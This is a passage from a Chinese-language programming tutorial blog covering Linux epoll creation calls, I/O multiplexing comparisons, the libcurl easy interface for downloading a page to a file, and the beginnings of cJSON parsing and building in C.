class="line"><span class="keyword">if</span> (epfd == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">event.events = EPOLLIN;</span><br><span class="line">event.data.fd = sockfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &amp;event) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;epoll_ctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[10];</span></span><br><span class="line"><span class="type">int</span> nfds = epoll_wait(epfd, events, <span class="number">10</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</span><br><span class="line">        <span class="comment">// 处理可读事件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(epfd);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>epoll_create</code> 和 <code>epoll_create1</code> 是用于创建 epoll 实例的系统调用。epoll 是 Linux 特有的 I&#x2F;O 多路复用机制，适用于高效地监视大量文件描述符。虽然这两个函数都用于创建 epoll 实例，但它们之间有一些区别。</p>
<p><strong><code>epoll_create</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_create</span><span class="params">(<span class="type">int</span> size)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数</strong></p>
<ul>
<li><code>size</code>: 这个参数在现代 Linux 内核中已经被忽略，但在早期版本中，它用于建议内核分配的文件描述符数量。尽管如此，仍然需要传递一个大于零的值。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时返回一个新的 epoll 文件描述符。</li>
<li>失败时返回 <code>-1</code>，并设置 <code>errno</code>。</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li><code>epoll_create</code> 在现代使用中，<code>size</code> 参数没有实际意义，但仍然需要提供一个正整数。</li>
<li>该函数在 Linux 2.6.8 及更高版本中被 <code>epoll_create1</code> 所取代。</li>
</ul>
<p><strong><code>epoll_create1</code></strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_create1</span><span class="params">(<span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数</strong></p>
<ul>
<li><code>flags</code>: 可以是 0 或 <code>EPOLL_CLOEXEC</code>。<code>EPOLL_CLOEXEC</code> 标志用于在执行 <code>exec</code> 系列函数时自动关闭 epoll 文件描述符。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>成功时返回一个新的 epoll 文件描述符。</li>
<li>失败时返回 <code>-1</code>，并设置 <code>errno</code>。</li>
</ul>
<p><strong>优势</strong></p>
<ul>
<li><code>epoll_create1</code> 提供了更灵活的接口，允许设置标志（如 <code>EPOLL_CLOEXEC</code>），这在多线程或多进程环境中非常有用。</li>
<li>该函数在 Linux 2.6.27 及更高版本中可用。</li>
</ul>
<p><strong>使用示例</strong></p>
<p>以下是如何使用 <code>epoll_create1</code> 创建一个 epoll 实例的简单示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> epfd = epoll_create1(<span class="number">0</span>); <span class="comment">// 不使用任何标志</span></span><br><span class="line">    <span class="keyword">if</span> (epfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 epoll 实例进行其他操作...</span></span><br><span class="line"></span><br><span class="line">    close(epfd); <span class="comment">// 关闭 epoll 文件描述符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结</strong></p>
<ul>
<li><strong><code>epoll_create</code></strong>: 旧的接口，<code>size</code> 参数在现代内核中被忽略，但仍然需要提供。</li>
<li><strong><code>epoll_create1</code></strong>: 新的接口，支持 <code>EPOLL_CLOEXEC</code> 标志，推荐在现代应用中使用。</li>
</ul>
<p>在编写新的代码时，建议使用 <code>epoll_create1</code>，因为它提供了更好的功能和灵活性。</p>
</blockquote>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul>
<li><strong><code>select</code></strong>: 简单易用，但有文件描述符数量限制。</li>
<li><strong><code>poll</code></strong>: 改进了 <code>select</code> 的一些限制，但仍然需要遍历文件描述符。</li>
<li><strong><code>epoll</code></strong>: 适用于大规模并发连接，效率高，是 Linux 上的推荐选择。</li>
</ul>
<p>选择合适的 I&#x2F;O 多路复用机制取决于应用程序的需求和环境。对于高并发的网络服务器，<code>epoll</code> 通常是最佳选择。</p>
<h1 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h1><h2 id="libcurl"><a href="#libcurl" class="headerlink" title="libcurl"></a>libcurl</h2><p>相关函数的详细解析 <a class="link"   target="_blank" rel="noopener" href="https://curl.se/libcurl/c/allfuncs.html" >官方教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 写的很全，相关的<code>flag</code>和错误处理表可以参见官方教程，这里介绍一般的使用流程。</p>
<h3 id="API-easy"><a href="#API-easy" class="headerlink" title="API: easy"></a>API: easy</h3><p><code>libcurl</code> 的 <code>easy</code> 接口是一个简单且强大的工具，用于执行单个 HTTP 请求。下面是 <code>libcurl-easy</code> 使用的详细指南，包括初始化、设置选项、执行请求和清理资源的步骤。</p>
<h3 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1. 初始化"></a>1. 初始化</h3><p>在使用 <code>libcurl</code> 之前，你需要初始化库。通常使用 <code>curl_global_init()</code> 来完成这个步骤。这一步通常只需要在程序开始时调用一次。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CURLcode res = curl_global_init(CURL_GLOBAL_DEFAULT);</span><br><span class="line">    <span class="keyword">if</span> (res != CURLE_OK) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;curl_global_init() failed: %s\n&quot;</span>, curl_easy_strerror(res));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他代码...</span></span><br><span class="line"></span><br><span class="line">    curl_global_cleanup(); <span class="comment">// 清理全局资源</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="2-创建和初始化-CURL-句柄"><a href="#2-创建和初始化-CURL-句柄" class="headerlink" title="2. 创建和初始化 CURL 句柄"></a>2. 创建和初始化 <code>CURL</code> 句柄</h3><p>使用 <code>curl_easy_init()</code> 函数创建一个 <code>CURL</code> 句柄。这是一个指向 <code>CURL</code> 结构体的指针，用于设置请求选项和执行请求。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CURL *curl = curl_easy_init();</span><br><span class="line"><span class="keyword">if</span> (!curl) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to create CURL handle\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="3-设置请求选项"><a href="#3-设置请求选项" class="headerlink" title="3. 设置请求选项"></a>3. 设置请求选项</h3><p>使用 <code>curl_easy_setopt()</code> 函数设置请求选项。常用的选项包括 URL、回调函数、请求方法等。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">curl_easy_setopt(curl, CURLOPT_URL, <span class="string">&quot;http://example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置回调函数（如果需要处理响应）</span></span><br><span class="line">curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);</span><br><span class="line">curl_easy_setopt(curl, CURLOPT_WRITEDATA, userdata);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置请求头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">curl_slist</span> *<span class="title">headers</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">headers = curl_slist_append(headers, <span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">headers = curl_slist_append(headers, <span class="string">&quot;Authorization: ******&quot;</span>);</span><br><span class="line">curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置请求体</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *data = <span class="string">&quot;****&quot;</span>;</span><br><span class="line">curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);</span><br></pre></td></tr></table></figure></div>

<p><code>CURLOPT_WRITEDATA</code> 和 <code>CURLOPT_WRITEFUNCTION</code> 是 libcurl 中的两个选项，用于控制数据的接收和处理方式。它们通常用于设置自定义的回调函数，以便处理从服务器接收到的数据。</p>
<h4 id="CURLOPT-WRITEDATA"><a href="#CURLOPT-WRITEDATA" class="headerlink" title="CURLOPT_WRITEDATA"></a>CURLOPT_WRITEDATA</h4><p><code>CURLOPT_WRITEDATA</code> 是一个选项，用于指定一个指针，该指针会传递给 <code>CURLOPT_WRITEFUNCTION</code> 设置的回调函数。通常，这个指针用于传递用户定义的数据结构，比如一个文件指针或一个缓冲区结构体。</p>
<p><strong>用法</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);</span><br></pre></td></tr></table></figure></div>

<p>在这个例子中，<code>fp</code> 是一个文件指针，指向打开的文件 <code>output.txt</code>。这个指针会被传递给回调函数，用于写入数据。</p>
<h4 id="CURLOPT-WRITEFUNCTION"><a href="#CURLOPT-WRITEFUNCTION" class="headerlink" title="CURLOPT_WRITEFUNCTION"></a>CURLOPT_WRITEFUNCTION</h4><p><code>CURLOPT_WRITEFUNCTION</code> 用于设置一个回调函数，该函数负责处理从服务器接收到的数据。默认情况下，libcurl 会将数据写入标准输出，但通过设置这个选项，你可以自定义数据的处理方式。</p>
<p><strong>回调函数的定义</strong></p>
<p>回调函数需要符合特定的签名：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">write_callback</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userdata)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ptr</code>: 指向接收到的数据的指针。</li>
<li><code>size</code>: 每个数据单元的大小。通常是 1。</li>
<li><code>nmemb</code>: 数据单元的数量。</li>
<li><code>userdata</code>: 由 <code>CURLOPT_WRITEDATA</code> 传递的用户数据指针。</li>
</ul>
<p>回调函数应返回实际处理的数据字节数。如果返回值小于 <code>size * nmemb</code>，libcurl 会认为发生了错误并停止传输。</p>
<p><strong>用法示例</strong></p>
<p>以下是一个使用 <code>CURLOPT_WRITEFUNCTION</code> 和 <code>CURLOPT_WRITEDATA</code> 的完整示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_callback</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userdata)</span> &#123;</span><br><span class="line">    FILE *fp = (FILE *)userdata;</span><br><span class="line">    <span class="type">size_t</span> written = fwrite(ptr, size, nmemb, fp);</span><br><span class="line">    <span class="keyword">return</span> written;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    CURL *curl;</span><br><span class="line">    CURLcode res;</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl = curl_easy_init();</span><br><span class="line">    <span class="keyword">if</span> (curl) &#123;</span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_URL, <span class="string">&quot;http://example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置写入数据的回调函数</span></span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置传递给回调函数的用户数据</span></span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行请求</span></span><br><span class="line">        res = curl_easy_perform(curl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 清理</span></span><br><span class="line">        curl_easy_cleanup(curl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结</strong></p>
<ul>
<li><strong>CURLOPT_WRITEDATA</strong>: 用于传递用户数据指针给回调函数。</li>
<li><strong>CURLOPT_WRITEFUNCTION</strong>: 用于设置自定义的回调函数，以处理接收的数据。</li>
</ul>
<p>通过这两个选项，你可以灵活地控制数据的接收和处理方式，比如将数据写入文件、存储在内存中，或者进行其他自定义处理。</p>
<p><strong>其他常见请求</strong></p>
<ul>
<li><strong>CURLOPT_USERAGENT</strong>：设置 User-Agent 字符串。</li>
<li><strong>CURLOPT_TIMEOUT</strong>：设置请求超时时间。</li>
<li><strong>CURLOPT_POST</strong>：设置为 1 以启用 POST 请求。</li>
<li><strong>CURLOPT_POSTFIELDS</strong>：设置 POST 请求的字段数据。</li>
<li><strong>CURLOPT_HTTPHEADER</strong>：设置自定义 HTTP 头。</li>
</ul>
<h3 id="4-执行请求"><a href="#4-执行请求" class="headerlink" title="4. 执行请求"></a>4. 执行请求</h3><p>使用 <code>curl_easy_perform()</code> 执行请求。这个函数会阻塞当前线程，直到请求完成。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CURLcode res = curl_easy_perform(curl);</span><br><span class="line"><span class="keyword">if</span> (res != CURLE_OK) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;curl_easy_perform() failed: %s\n&quot;</span>, curl_easy_strerror(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="5-清理资源"><a href="#5-清理资源" class="headerlink" title="5. 清理资源"></a>5. 清理资源</h3><p>请求完成后，使用 <code>curl_easy_cleanup()</code> 释放 <code>CURL</code> 句柄。最后，使用 <code>curl_global_cleanup()</code> 清理全局资源。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_easy_cleanup(curl);</span><br><span class="line">curl_global_cleanup();</span><br></pre></td></tr></table></figure></div>

<h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><p>下面是一个完整的示例程序，演示如何使用 <code>libcurl-easy</code> 接口下载网页内容到文件：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;curl/curl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">write_callback</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, <span class="type">void</span> *userdata)</span> &#123;</span><br><span class="line">    FILE *file = (FILE *)userdata;</span><br><span class="line">    <span class="keyword">return</span> fwrite(ptr, size, nmemb, file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    CURL *curl;</span><br><span class="line">    CURLcode res;</span><br><span class="line">    FILE *file;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_global_init(CURL_GLOBAL_DEFAULT);</span><br><span class="line">    curl = curl_easy_init();</span><br><span class="line">    <span class="keyword">if</span> (curl) &#123;</span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_URL, <span class="string">&quot;http://example.com&quot;</span>);</span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);</span><br><span class="line">        curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);</span><br><span class="line"></span><br><span class="line">        res = curl_easy_perform(curl);</span><br><span class="line">        <span class="keyword">if</span> (res != CURLE_OK) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;curl_easy_perform() failed: %s\n&quot;</span>, curl_easy_strerror(res));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        curl_easy_cleanup(curl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    curl_global_cleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h2><p><code>cJSON</code> 是一个轻量级的 JSON 解析和生成库，使用 C 语言编写。它提供了一组简单的 API，用于解析 JSON 数据、构建 JSON 对象以及将 JSON 对象转换为字符串。以下是 <code>cJSON</code> 的详细解析指南。</p>
<h3 id="1-安装和包含头文件"><a href="#1-安装和包含头文件" class="headerlink" title="1. 安装和包含头文件"></a>1. 安装和包含头文件</h3><p>首先，你需要确保 <code>cJSON</code> 库已经安装。你可以从 <a class="link"   target="_blank" rel="noopener" href="https://github.com/DaveGamble/cJSON" >cJSON 的 GitHub 仓库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载源代码并，将<code>cJSON.h</code>放入你项目的<code>include</code>文件夹，<code>cJSON.c</code>放入你的<code>src</code>文件夹即可。</p>
<p>在你的 C 项目中，包含 <code>cJSON.h</code> 头文件：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cJSON.h&quot;</span></span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-解析-JSON-字符串"><a href="#2-解析-JSON-字符串" class="headerlink" title="2. 解析 JSON 字符串"></a>2. 解析 JSON 字符串</h3><p>要解析 JSON 字符串，你可以使用 <code>cJSON_Parse()</code> 函数。它会返回一个 <code>cJSON</code> 对象指针，表示解析后的 JSON 对象。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *json_string = <span class="string">&quot;&#123;\&quot;name\&quot;: \&quot;John\&quot;, \&quot;age\&quot;: 30, \&quot;city\&quot;: \&quot;New York\&quot;&#125;&quot;</span>;</span><br><span class="line">cJSON *json = cJSON_Parse(json_string);</span><br><span class="line"><span class="keyword">if</span> (json == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to parse JSON\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="3-访问-JSON-对象的元素"><a href="#3-访问-JSON-对象的元素" class="headerlink" title="3. 访问 JSON 对象的元素"></a>3. 访问 JSON 对象的元素</h3><p>使用 <code>cJSON_GetObjectItem()</code> 来获取 JSON 对象中的元素。你可以通过键名来访问对应的值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cJSON *name = cJSON_GetObjectItem(json, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">cJSON *age = cJSON_GetObjectItem(json, <span class="string">&quot;age&quot;</span>);</span><br><span class="line">cJSON *city = cJSON_GetObjectItem(json, <span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cJSON_IsString(name) &amp;&amp; (name-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, name-&gt;valuestring);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cJSON_IsNumber(age)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, age-&gt;valueint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cJSON_IsString(city) &amp;&amp; (city-&gt;valuestring != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;City: %s\n&quot;</span>, city-&gt;valuestring);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="4-构建-JSON-对象"><a href="#4-构建-JSON-对象" class="headerlink" title="4. 构建 JSON 对象"></a>4. 构建 JSON 对象</h3><p>你可以使用 <code>cJSON_CreateObject()</code> 和其他创建函数来构建一个新的 JSON 对象。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cJSON *new_json = cJSON_CreateObject();</span><br><span class="line">cJSON_AddStringToObject(new_json, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Jane&quot;</span>);</span><br><span class="line">cJSON_AddNumberToObject(new_json, <span class="string">&quot;age&quot;</span>, <span class="number">25</span>);</span><br><span class="line">cJSON_AddStringToObject(new_json, <span class="string">&quot;city&quot;</span>, <span class="string">&quot;Los Angeles&quot;</span>);</span><br></pre></td></tr></table></figure></div>

